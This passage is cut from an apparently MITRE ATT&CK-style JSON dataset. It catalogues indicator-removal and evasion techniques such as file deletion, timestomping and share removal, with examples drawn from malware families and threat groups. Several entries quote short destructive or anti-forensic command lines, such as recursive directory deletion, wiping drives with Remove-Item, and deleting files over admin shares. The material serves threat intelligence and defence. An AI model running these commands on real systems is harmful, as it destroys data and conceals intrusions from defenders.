"Linfo creates a backdoor through which remote attackers can delete files."}, {"id": "S0513", "name": "LiteDuke", "description": "LiteDuke can securely delete files by first writing random data to the file."}, {"id": "S0372", "name": "LockerGoga", "description": "LockerGoga has been observed deleting its original launcher after execution."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot will delete its dropped files after bypassing UAC."}, {"id": "S0582", "name": "LookBack", "description": "LookBack removes itself after execution and can delete files on the system."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner deleted installation files after completion."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail can delete the previously used staging directory and files on subsequent rounds of exfiltration and replace it with a new one."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can self-delete from a compromised host if safety checks of C2 connectivity fail."}, {"id": "S0409", "name": "Machete", "description": "Once a file is uploaded, Machete will delete it from the machine."}, {"id": "S1016", "name": "MacMa", "description": "MacMa can delete itself from the compromised computer."}, {"id": "S0282", "name": "MacSpy", "description": "MacSpy deletes any temporary files it creates"}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has deleted and overwrote files to cover tracks."}, {"id": "G0045", "name": "menuPass", "description": "A menuPass macro deletes files after it has decoded and decompressed them."}, {"id": "S0443", "name": "MESSAGETAP", "description": "Once loaded into memory, MESSAGETAP deletes the keyword_parm.txt and parm.txt configuration files from disk. "}, {"id": "G1013", "name": "Metador", "description": "Metador has quickly deleted cbd.exe from a compromised host following the successful deployment of their malware."}, {"id": "S1059", "name": "metaMain", "description": "metaMain has deleted collected items after uploading the content to its C2 server."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has deleted itself from the system after execution."}, {"id": "S0688", "name": "Meteor", "description": "Meteor will delete the folder containing malicious scripts if it detects the hostname as PIS-APP, PIS-MOB, WSUSPROXY, or PIS-DB."}, {"id": "S1015", "name": "Milan", "description": "Milan can delete files via C:\\Windows\\system32\\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q."}, {"id": "S0083", "name": "Misdat", "description": "Misdat is capable of deleting the backdoor file."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind can delete itself or specified files."}, {"id": "S0284", "name": "More_eggs", "description": "More_eggs can remove itself from a system."}, {"id": "S1047", "name": "Mori", "description": "Mori can delete its DLL file and related files by Registry value."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito deletes files using DeleteFileW API call."}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper uses a batch file, remover.bat to delete malware artifacts and the batch file itself during execution."}, {"id": "S0233", "name": "MURKYTOP", "description": "MURKYTOP has the capability to delete local files."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda will delete their tools and files, and kill processes after their objectives are reached."}, {"id": "S0228", "name": "NanHaiShu", "description": "NanHaiShu launches a script to delete their original decoy file to cover tracks."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae has the ability to delete files and directories."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor can self-delete."}, {"id": "S0385", "name": "njRAT", "description": "njRAT is capable of deleting files."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI can delete files to cover tracks."}, {"id": "S0346", "name": "OceanSalt", "description": "OceanSalt can delete files from the system."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has deleted files associated with their payload after execution."}, {"id": "S0439", "name": "Okrum", "description": "Okrum's backdoor deletes files after they have been successfully uploaded to C2 servers."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE has the capability to delete files and scripts from the victim's machine."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group removed all previously delivered files from a compromised computer."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors used batch files that reduced their fingerprint on a compromised system by deleting malware-related files."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, the threat actors consistently removed traces of their activity by first overwriting a file using /c cd /d c:\\windows\\temp\\ & copy \\\\<IP ADDRESS>\\c$\\windows\\system32\\devmgr.dll \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1 /y and then deleting the overwritten file using /c cd /d c:\\windows\\temp\\ & del \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D has a command to delete a file from the system. OSX_OCEANLOTUS.D deletes the app bundle and dropper after execution."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel can delete itself following the successful execution of a follow-on payload."}, {"id": "S0598", "name": "P.A.S. Webshell", "description": "P.A.S. Webshell can delete scripts from a subdirectory of /tmp after they are run."}, {"id": "S0208", "name": "Pasam", "description": "Pasam creates a backdoor through which remote attackers can delete files."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork removed certain files and replaced them so they could not be retrieved."}, {"id": "S0556", "name": "Pay2Key", "description": "Pay2Key can remove its log file from disk."}, {"id": "S1050", "name": "PcShare", "description": "PcShare has deleted its files and components from a compromised host."}, {"id": "S0587", "name": "Penquin", "description": "Penquin can delete downloaded executables after running them."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint has deleted the filepath %APPDATA%\\Intel\\devmonsrv.exe."}, {"id": "G1040", "name": "Play", "description": "Play has used tools including Wevtutil to remove malicious files from compromised hosts."}, {"id": "S0435", "name": "PLEAD", "description": "PLEAD has the ability to delete files on the compromised host."}, {"id": "S0067", "name": "pngdowner", "description": "pngdowner deletes content from C2 communications that was saved to the user's temporary directory."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has the ability to overwrite scripts and delete itself if a sandbox environment is detected."}, {"id": "S0453", "name": "Pony", "description": "Pony has used scripts to delete itself after execution."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke has a command to write random data across a file and delete it."}, {"id": "S0441", "name": "PowerShower", "description": "PowerShower has the ability to remove all files created during the dropper process."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can delete all files on the C:\\, D:\\, E:\\ and, F:\\ drives using PowerShell Remove-Item commands."}, {"id": "S0113", "name": "Prikormka", "description": "After encrypting its own log files, the log encryption module in Prikormka deletes the original, unencrypted files from the host."}, {"id": "S0654", "name": "ProLock", "description": "ProLock can remove files containing its payload after they are executed."}, {"id": "S0279", "name": "Proton", "description": "Proton removes all files in the /tmp directory."}, {"id": "S0238", "name": "Proxysvc", "description": "Proxysvc can delete files indicated by the attacker and remove itself from disk using a batch file."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon can delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY can delete files written to disk."}, {"id": "S1032", "name": "PyDCrypt", "description": "PyDCrypt will remove all created artifacts such as dropped executables."}, {"id": "S0583", "name": "Pysa", "description": "Pysa has deleted batch files after execution. "}, {"id": "S0650", "name": "QakBot", "description": "QakBot can delete folders and files including overwriting its executable with legitimate programs."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT has a command to delete its Registry key and scheduled task."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer can remove files related to use and installation."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay has the ability to uninstall itself by deleting its service and files."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin can delete its initial delivery script from disk during execution."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can remove files from a targeted system."}, {"id": "S0495", "name": "RDAT", "description": "RDAT can issue SOAP requests to delete already processed C2 emails. RDAT can also delete itself from the infected system."}, {"id": "S0416", "name": "RDFSNIFFER", "description": "RDFSNIFFER has the capability of deleting local files."}, {"id": "S0172", "name": "Reaver", "description": "Reaver deletes the original dropped file from the victim."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has deleted files after execution."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves can delete specified files."}, {"id": "S0125", "name": "Remsec", "description": "Remsec is capable of deleting files on the victim. It also securely removes itself after collecting and exfiltrating data."}, {"id": "S0496", "name": "REvil", "description": "REvil can mark its binary code for deletion after reboot."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun can delete files and artifacts it creates."}, {"id": "S1150", "name": "ROADSWEEP", "description": "ROADSWEEP can use embedded scripts to remove itself from the infected host."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has deleted files on infected machines."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can request to delete files."}, {"id": "S0148", "name": "RTM", "description": "RTM can delete all files created during its execution."}, {"id": "S0253", "name": "RunningRAT", "description": "RunningRAT contains code to delete files from the victim\u2019s machine."}, {"id": "S0085", "name": "S-Type", "description": "S-Type has deleted files it has created on a compromised host."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot can run a batch script named del.bat to remove any Saint Bot payload-linked files from a compromise system if anti-analysis or locale checks fail."}, {"id": "S0074", "name": "Sakula", "description": "Some Sakula samples use cmd.exe to delete temporary files."}, {"id": "S0370", "name": "SamSam", "description": "SamSam has been seen deleting its own files and payloads to make analysis of the attack more difficult."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used backdoors that can delete files used in an attack from an infected system."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to delete files from a compromised host."}, {"id": "S0195", "name": "SDelete", "description": "SDelete deletes data in a way that makes it unrecoverable."}, {"id": "S0053", "name": "SeaDuke", "description": "SeaDuke can securely delete files, including deleting itself from the victim."}, {"id": "S0345", "name": "Seasalt", "description": "Seasalt has a command to delete a specified file."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper has a module to delete itself from the infected machine."}, {"id": "S1019", "name": "Shark", "description": "Shark can delete files downloaded to the compromised host."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat can uninstall itself from compromised hosts, as well create and modify directories, delete, move, copy, and rename files."}, {"id": "S0589", "name": "Sibot", "description": "Sibot will delete itself if a certain server response is received."}, {"id": "G0091", "name": "Silence", "description": "Silence has deleted artifacts, including scheduled tasks, communicates files from the C2 and other logs."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can remove files from the compromised host."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has deleted itself and the 'index.dat' file on a compromised machine to remove recent Internet history from the system."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 routinely removed their tools, including custom backdoors, once remote access was achieved."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT has the ability to run cancel or closeanddeletestorage to remove all files from storage and delete the storage temp file on a compromised host."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp deletes files to remove evidence on the machine. "}, {"id": "S0390", "name": "SQLRat", "description": "SQLRat has used been observed deleting scripts once used."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill has been observed deleting the temporary files once they fulfill their task."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater can self delete to cover its tracks."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can delete previously exfiltrated files from the compromised host."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet uses an RPC server that contains a routine for file deletion and also removes itself from the system through a DLL export by deleting specific files."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST had a command to delete files."}, {"id": "S0562", "name": "SUNSPOT", "description": "Following the successful injection of SUNBURST, SUNSPOT deleted a temporary file it created named InventoryManager.bk after restoring the original SolarWinds Orion source code to the software library."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can delete its configuration file from the targeted system."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor can use DeleteFileA to remove files from infected hosts."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "TAINTEDSCRIBE can delete files from a compromised host."}, {"id": "S0164", "name": "TDTESS", "description": "TDTESS creates then deletes log files during installation of itself as a service."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has used a payload that removes itself after running. TeamTNT also has deleted locally staged files for collecting credentials or scan results for local IP addresses after exfiltrating them."}, {"id": "G0089", "name": "The White Company", "description": "The White Company has the ability to delete its malware entirely from the target system."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has deleted existing logs and exfiltrated file archives from a victim."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany has used plugins with a self-delete capability."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has deleted dropper files on an infected system using command scripts."}, {"id": "S0263", "name": "TYPEFRAME", "description": "TYPEFRAME can delete files off the system."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can run a Clear Agents Track command on an infected machine to delete Uroburos-related logs."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has deleted data staged in tmp files after exfiltration."}, {"id": "S0136", "name": "USBStealer", "description": "USBStealer has several commands to delete files associated with the malware from the victim."}, {"id": "S0442", "name": "VBShower", "description": "VBShower has attempted to complicate forensic analysis by deleting all the files contained in %APPDATA%..\\Local\\Temporary Internet Files\\Content.Word and %APPDATA%..\\Local Settings\\Temporary Internet Files\\Content.Word\\."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN can delete files on the victim\u2019s machine."}, {"id": "S1154", "name": "VersaMem", "description": "VersaMem deleted files related to initial installation such as temporary files related to the PID of the main web process."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer can delete files and itself after infection to avoid analysis."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has run rd /S to delete their working directories and deleted systeminfo.dat from C:\\Users\\Public\\Documentsfiles."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can delete tools from a compromised host after execution."}, {"id": "S0155", "name": "WINDSHIELD", "description": "WINDSHIELD is capable of file deletion along with other file system interaction."}, {"id": "S0466", "name": "WindTail", "description": "WindTail has the ability to receive and execute a self-delete command."}, {"id": "S0176", "name": "Wingbird", "description": "Wingbird deletes its payload along with the payload's parent process after it finishes copying files."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows can delete the DLLs for its various components from a compromised host."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used file deletion to remove some modules and configurations from an infected host after use."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT has the ability to delete itself from disk by creating a suspended notepad process and writing shellcode to delete a file into the suspended process using NtWriteVirtualMemory."}, {"id": "S0161", "name": "XAgentOSX", "description": "XAgentOSX contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy has a command to delete files and directories."}, {"id": "S1151", "name": "ZeroCleare", "description": "ZeroCleare has the ability to uninstall the RawDisk driver and delete the rwdsk file on disk."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda has a command to delete a file. It also can uninstall scripts and delete files to cover its track."}, {"id": "S0350", "name": "zwShell", "description": "zwShell has deleted itself after creating a service as well as deleted a temporary file when the system reboots."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can delete files from the system."}]}, {"name": "Network Share Connection Removal", "description": "Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and SMB/Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the net use \\system\\share /delete command. ", "detailed_description": "Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and SMB/Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the net use \\system\\share /delete command. ", "id": "T1070.005", "examples": [{"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can remove network shares from infected systems."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can disconnect previously connected remote drives."}, {"id": "S0039", "name": "Net", "description": "The net use \\system\\share /delete command can be used in Net to remove an established connection to a network share."}, {"id": "S0400", "name": "RobbinHood", "description": "RobbinHood disconnects all network shares from the computer with the command net use * /DELETE /Y."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has detached network shares after exfiltrating files, likely to evade detection."}]}, {"name": "Timestomp", "description": "Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.", "detailed_description": "Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.\nBoth the $STANDARD_INFORMATION ($SI) and $FILE_NAME ($FN) attributes record times in a Master File Table (MFT) file. $SI (dates/time stamps) is displayed to the end user, including in the File System view, while $FN is dealt with by the kernel.\nModifying the $SI attribute is the most common method of timestomping because it can be modified at the user level using API calls. $FN timestomping, however, typically requires interacting with the system kernel or moving or renaming a file.\nAdversaries modify timestamps on files so that they do not appear conspicuous to forensic investigators or file analysis tools. In order to evade detections that rely on identifying discrepancies between the $SI and $FN attributes, adversaries may also engage in \"double timestomping\" by modifying times on both attributes simultaneously.\nTimestomping may be used along with file name Masquerading to hide malware and tools.", "id": "T1070.006", "examples": [{"id": "S0066", "name": "3PARA RAT", "description": "3PARA RAT has a command to set certain attributes such as creation/modification timestamps on files."}, {"id": "G0007", "name": "APT28", "description": "APT28 has performed timestomping on victim files."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used timestomping to alter the Standard Information timestamps on their web shells to match other files in the same directory."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used scheduled task raw XML with a backdated timestamp of June 2, 2016. The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll. Additionally, APT32 has used a random value to modify the timestamp of the file storing the clientID."}, {"id": "G0082", "name": "APT38", "description": "APT38 has modified data timestamps to mimic files that are in the same folder on a compromised host."}, {"id": "G1023", "name": "APT5", "description": "APT5 has modified file timestamps."}, {"id": "S0438", "name": "Attor", "description": "Attor has manipulated the time of last access to files and registry keys after they have been created or modified."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot modifies the time of a file as specified by the control server."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer can modify the timestamp of an executable so that it can be identified and restored by the decryption tool."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has modified file and directory timestamps."}, {"id": "S1161", "name": "BPFDoor", "description": "BPFDoor uses the utimes() function to change the executable's timestamp."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used timestomping to modify the $STANDARD_INFORMATION attribute on tools."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used a Windows version of the Linux touch command to modify the date and time stamp on DLLs."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can time stomp its executable, previously dating it between 2010 to 2021."}, {"id": "S0020", "name": "China Chopper", "description": "China Chopper's server component can change the timestamp of files."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can timestomp any files or payloads placed on a target machine to help them blend in."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors changed timestamps of multiple files on compromised Ivanti Secure Connect VPNs to conceal malicious activity."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink has the ability to use the Linux API function utime to change the timestamps of modified firmware update images."}, {"id": "S0021", "name": "Derusbi", "description": "The Derusbi malware supports timestomping."}, {"id": "S0081", "name": "Elise", "description": "Elise performs timestomping of a CAB file it creates."}, {"id": "S0363", "name": "Empire", "description": "Empire can timestomp any files or payloads placed on a target machine to help them blend in."}, {"id": "S0568", "name": "EVILNUM", "description": "EVILNUM has changed the creation date of files."}, {"id": "S0181", "name": "FALLCHILL", "description": "FALLCHILL can modify file or directory timestamps."}, {"id": "S0168", "name": "Gazer", "description": "For early Gazer versions, the compilation timestamp was faked."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium has the ability to perform timestomping of files on targeted systems."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole samples were timestomped by the authors by setting the PE timestamps to all zero values. InvisiMole also has a built-in command to modify file times."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy time-stomped its DLL in order to evade detection."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has manipulated timestamps for creation or compilation dates to defeat anti-forensics."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos can modify timestamps of replaced files, such as ssh with the added credential stealer or sshd used to deploy Kobalos."}, {"id": "G0032", "name": "Lazarus Group", "description": "Several Lazarus Group malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files."}, {"id": "S1016", "name": "MacMa", "description": "MacMa has the capability to create and modify file timestamps."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can change the CreationTime, LastAccessTime, and LastWriteTime file time attributes when executed with SYSTEM privileges."}, {"id": "S0083", "name": "Misdat", "description": "Many Misdat samples were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file."}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper changes timestamps of overwritten files to either 1601.1.1 for NTFS filesystems, or 1980.1.1 for all other filesystems."}, {"id": "S1090", "name": "NightClub", "description": "NightClub can modify the Creation, Access, and Write timestamps for malicious DLLs to match those of the genuine Windows DLL user32.dll."}, {"id": "S1100", "name": "Ninja", "description": "Ninja can change or create the last access or write times."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D can use the touch -t command to change timestamps."}, {"id": "S0072", "name": "OwaAuth", "description": "OwaAuth has a command to timestop a file or directory."}, {"id": "S1031", "name": "PingPull", "description": "PingPull has the ability to timestomp a file."}, {"id": "S0150", "name": "POSHSPY", "description": "POSHSPY modifies timestamps of all downloaded executables to match a randomly selected file created prior to 2013."}, {"id": "S0393", "name": "PowerStallion", "description": "PowerStallion modifies the MAC times of its local log files to match that of the victim's desktop.ini file."}, {"id": "S0078", "name": "Psylo", "description": "Psylo has a command to conduct timestomping by setting a specified file\u2019s timestamps to match those of a system file in the System32 directory."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has changed the time stamp of certain files."}, {"id": "S0185", "name": "SEASHARPEE", "description": "SEASHARPEE can timestomp files on victims using a Web shell."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon can change the modified time for files to evade forensic detection."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 modified timestamps of backdoors to match legitimate Windows files."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet extracts and writes driver files that match the times of other legitimate files."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "TAINTEDSCRIBE can change the timestamp of specified filenames."}, {"id": "S0164", "name": "TDTESS", "description": "After creating a new service for persistence, TDTESS sets the file creation time for the service to the creation time of the victim's legitimate svchost.exe file."}, {"id": "S0136", "name": "USBStealer", "description": "USBStealer sets the timestamps of its dropper files to the last-access and last-write timestamps of a standard Windows library chosen on the system."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows can set the timestamps for its worker and service components to match that of cmd.exe."}]}, {"name": "Clear Network Connection History and Configurations", "description": "Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as Remote Services or External Remote Services. Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.", "detailed_description": "Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as Remote Services or External Remote Services. Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\nNetwork connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under :\nWindows may also store information about recent RDP connections in files such as C:\\Users\\%username%\\Documents\\Default.rdp and C:\\Users\\%username%\\AppData\\Local\\Microsoft\\TerminalServer Client\\Cache\\. Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in /Library/Logs and/or /var/log/).\nMalicious network connections may also require changes to third-party applications or network configuration settings, such as Disable or Modify System Firewall or tampering to enable Proxy. Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.", "id": "T1070.007", "examples": [{"id": "S0559", "name": "SUNBURST", "description": "SUNBURST also removed the firewall rules it created during execution."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has inspected server logs to remove their IPs."}]}, {"name": "Clear Mailbox Data", "description": "Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests.", "detailed_description": "Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests.\nAdversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of Phishing/Internal Spearphishing, Email Collection, Mail Protocols for command and control, or email-based exfiltration such as Exfiltration Over Alternative Protocol. For example, to remove evidence on Exchange servers adversaries have used the ExchangePowerShell PowerShell module, including Remove-MailboxExportRequest to remove evidence of mailbox exports. On Linux and macOS, adversaries may also delete emails through a command line utility called mail  or use AppleScript to interact with APIs on macOS.\nAdversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.", "id": "T1070.008", "examples": [{"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to delete emails used for C2 once the content has been copied."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail can set the PR_DELETE_AFTER_SUBMIT flag to delete messages sent for data exfiltration."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 removed evidence of email export requests using Remove-MailboxExportRequest."}]}, {"name": "Clear Persistence", "description": "Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, Modify Registry, Plist File Modification, or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence. Adversaries may also delete accounts previously created to maintain persistence (i.e. Create Account).", "detailed_description": "Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, Modify Registry, Plist File Modification, or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence. Adversaries may also delete accounts previously created to maintain persistence (i.e. Create Account).\nIn some instances, artifacts of persistence may also be removed once an adversary\u2019s persistence is executed in order to prevent errors with the new instance of the malware.", "id": "T1070.009", "examples": [{"id": "S0534", "name": "Bazar", "description": "Bazar's loader can delete scheduled tasks created by a previous instance of the malware."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can delete previously created tasks on a compromised host."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper can delete various service traces related to persistent execution when commanded."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS can delete created registry keys used for persistence as part of its cleanup procedure."}, {"id": "S0500", "name": "MCMD", "description": "MCMD has the ability to remove set Registry Keys, including those used for persistence."}, {"id": "S0083", "name": "Misdat", "description": "Misdat is capable of deleting Registry keys used for persistence."}, {"id": "S0385", "name": "njRAT", "description": "njRAT is capable of manipulating and deleting registry keys, including those used for persistence."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint can uninstall the malicious service from an infected machine."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin uses a RunOnce Registry key for persistence, where the key is removed after its use on reboot then re-added by the malware after it resumes execution."}, {"id": "S0148", "name": "RTM", "description": "RTM has the ability to remove Registry entries that it created for persistence."}, {"id": "S0085", "name": "S-Type", "description": "S-Type has deleted accounts it has created."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST removed IFEO registry values to clean up traces of persistence."}]}, {"name": "Relocate Malware", "description": "Once a payload is delivered, adversaries may reproduce copies of the same malware on the victim system to remove evidence of their presence and/or avoid defenses. Copying malware payloads to new locations may also be combined with File Deletion to cleanup older artifacts.", "detailed_description": "Once a payload is delivered, adversaries may reproduce copies of the same malware on the victim system to remove evidence of their presence and/or avoid defenses. Copying malware payloads to new locations may also be combined with File Deletion to cleanup older artifacts.\nRelocating malware may be a part of many actions intended to evade defenses. For example, adversaries may copy and rename payloads to better blend into the local environment (i.e., Match Legitimate Name or Location). Payloads may also be repositioned to target File/Path Exclusions as well as specific locations associated with establishing Persistence.\nRelocating malicious payloads may also hinder defensive analysis, especially to separate these payloads from earlier events (such as User Execution and Phishing) that may have generated alerts or otherwise drawn attention from defenders.", "id": "T1070.010", "examples": []}]}, {"name": "Indirect Command Execution", "description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), Scriptrunner.exe, as well as other utilities may invoke the execution of programs and commands from a Command and Scripting Interpreter, Run window, or via scripts.", "detailed_description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), Scriptrunner.exe, as well as other utilities may invoke the execution of programs and commands from a Command and Scripting Interpreter, Run window, or via scripts.\nAdversaries may abuse these features for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd or file extensions more commonly associated with malicious payloads.", "id": "T1202", "examples": [{"id": "S0193", "name": "Forfiles", "description": "Forfiles can be used to subvert controls and possibly conceal command execution by not directly invoking cmd."}, {"id": "G0032", 